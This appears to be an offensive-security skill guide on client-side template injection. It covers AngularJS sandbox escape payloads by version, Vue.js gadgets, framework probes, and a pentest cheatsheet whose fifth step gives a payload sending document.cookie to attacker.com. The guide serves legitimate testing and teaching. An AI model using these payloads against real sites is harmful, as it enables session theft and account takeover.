---
name: offensive-csti
description: "Client-Side Template Injection (CSTI) — Angular (1.x and 2+/Ivy) sandbox bypasses, Vue.js template injection, AngularJS expression sandbox CVE chain, sandbox escape gadget chains, classic Angular sandbox escape evolution (1.0–1.5.x bypasses), and CSTI-vs-XSS distinction (CSTI doesn't require <script> — bypasses many XSS-only filters). Use when the application uses a client-side template engine and reflects user input into the DOM where it could be evaluated as a template expression."
---

# Client-Side Template Injection (CSTI)

When user input lands in a client-side template (Angular `{{ }}`, Vue `{{ }}`, Handlebars `{{ }}`, Mustache, etc.), the framework evaluates the expression. CSTI is XSS without `<script>` — bypasses many XSS filters that allowlist HTML but parse template syntax.

## Quick Workflow

1. Identify the front-end framework (View source, fingerprint)
2. Find reflection points in template-rendered regions
3. Inject framework-specific syntax
4. Confirm execution; escalate to full DOM XSS via sandbox escape

---

## Framework Identification

```html
<html ng-app="myApp">                  <!-- AngularJS 1.x -->
<div ng-controller="MyCtrl">

<div data-vue-loaded="true">           <!-- Vue.js -->
<div v-cloak>

<router-outlet></router-outlet>        <!-- Angular 2+ -->

<script src=".../mustache.min.js">     <!-- Mustache -->
<script src=".../handlebars.min.js">   <!-- Handlebars -->
```

```bash
# Wappalyzer / source view
curl -s https://target.com | grep -iE "angular|vue|react|handlebars|mustache"
```

## AngularJS 1.x

The classic CSTI target. AngularJS evaluates `{{expression}}` in templates. Many sites embedded user data in templates without sanitization.

### Detection

```
Input: {{7*7}}
Output: 49           ← CSTI confirmed
```

### Sandbox Escape (1.5.x and earlier)

AngularJS had a "sandbox" preventing `Function`, `eval`, `window` access. Multiple bypasses published over the years:

```javascript
// Angular 1.0 - 1.1.5 bypass
{{constructor.constructor('alert(1)')()}}

// Angular 1.2.x bypass
{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}

// Angular 1.5.x bypass
{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}

// Angular 1.6.x — sandbox removed; just eval
{{constructor.constructor('alert(1)')()}}
```

PortSwigger and multiple researchers maintain a chronological bypass list. For each AngularJS version, look up the corresponding bypass.

### When to Suspect AngularJS

Even modern sites still load AngularJS for legacy admin panels, customer support widgets, or third-party embeds. Always check.

## Angular 2+ (Modern)

Angular 2+ uses Ivy / View Engine compilers; templates are pre-compiled at build time. Direct template injection of attacker input is rare in production builds.

Edge cases:
- `[innerHTML]` binding with user input + `DomSanitizer.bypassSecurityTrustHtml` (developer error)
- Dynamic component creation from JIT compilation (very rare)
- `MSAPP_CASE`s: server-side rendering with template engines

```html
<div [innerHTML]="userInput | safeHtml">    <!-- ← bypass via custom pipe -->
```

If a custom pipe wraps `bypassSecurityTrustHtml`, user input can include scripts (XSS, not technically CSTI).

## Vue.js

```
{{ 7*7 }}              # Detection: returns 49
{{ this.$root.$el }}   # Access Vue root element
{{ constructor.constructor('alert(1)')() }}   # Common gadget
```

Vue 2 and Vue 3 differ in the available context, but `Function` constructor escape is the standard exploit. Vue templates inside SFCs (Single-File Components) are compiled — direct CSTI requires runtime template evaluation.

```javascript
// Vulnerable: dynamic template
new Vue({ template: userInput })

// Or v-html with user content (XSS, simpler than CSTI but related)
<div v-html="userInput"></div>
```

## Handlebars / Mustache

These are logic-less or semi-logic-less. CSTI here typically chains with helper-function abuse:

```
{{#with this}}
  {{lookup ../this 'constructor'}}
{{/with}}
```

Less common as direct attack; more common as indirect chain into prototype pollution or helper abuse.

## Distinguishing CSTI from XSS

CSTI doesn't need:
- `<script>` tags
- HTML event handlers
- `javascript:` URIs

It needs:
- The framework's template syntax (`{{}}`, `${}`, `<%>`)
- Input landing in a region the framework parses as template

Many WAFs and sanitizers catch HTML-flavored XSS and miss `{{constructor.constructor('alert(1)')()}}`.

## Detection Strategy

```javascript
// Probe each input field and reflection point with each framework's syntax
const probes = [
  '{{7*7}}',              // Angular / Vue / Handlebars / Mustache
  '${7*7}',               // Underscore / EJS / Lodash template
  '<%= 7*7 %>',           // EJS / Underscore
  '#{7*7}',               // Pug / Jade
  '{ 7*7 }',              // Some custom engines
];
// In each, look for the literal "49" in the response
```

Burp's Active Scanner has CSTI detection plugins for major frameworks.

## Engagement Cheatsheet

```bash
# 1. Identify framework
curl -s https://target.com | grep -iE "angular|vue|handlebars"

# 2. Find reflection points in template-rendered regions
# - Search results
# - Profile fields rendered in profile page
# - Notification messages
# - URL fragments rendered

# 3. Probe with framework-specific syntax
# Submit "{{7*7}}" — does response contain "49"?

# 4. If detected, find sandbox bypass for the version
# Cross-reference framework version + published bypass

# 5. Build payload that exfils cookie or runs arbitrary JS
{{constructor.constructor('document.location="//attacker.com/?c="+document.cookie')()}}

# 6. Document: framework, version, payload, sink, impact
```

## Reporting

- Specific framework + version
- Exact input location
- Probe response confirming CSTI
- Full exploit payload achieving DOM control
- Recommended fix: never reflect user input into template-rendered regions; use textContent/text-binding APIs

## Detection

CSTI executes entirely client-side. Server-side detection is indirect — XSS-style indicators after exploitation (cookie theft visible in subsequent access patterns).

---

## Key References

- PortSwigger "AngularJS sandbox escape" historical research
- Mario Heiderich's CSTI research papers
- AngularJS source — sandbox commit history shows each bypass and patch
- "Vue.js Security" (vuejs.org/v2/style-guide/)
- Source: https://github.com/SnailSploit/offensive-checklist/blob/main/csti.md
